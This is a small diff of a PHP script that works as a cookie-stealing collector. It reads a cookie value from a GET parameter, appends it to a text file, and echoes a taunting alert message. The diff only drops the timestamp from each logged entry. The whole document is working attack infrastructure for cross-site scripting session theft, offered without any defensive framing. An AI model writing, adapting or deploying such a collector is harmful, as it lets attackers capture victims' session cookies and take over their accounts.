@@ -1,9 +1,8 @@
 <?
 
 $cookie=$_GET['data'];
-$atime=date("y-m-d H:i:s");
 $log=fopen("data.txt","a");
-fwrite($log,$atime." ".$cookie."\r\n");
+fwrite($log," ".$cookie."\r\n");
 fclose($log);
 echo "<img src=\'0\' onerror=alert(\"daniel takes your cookie\")></img>";
 
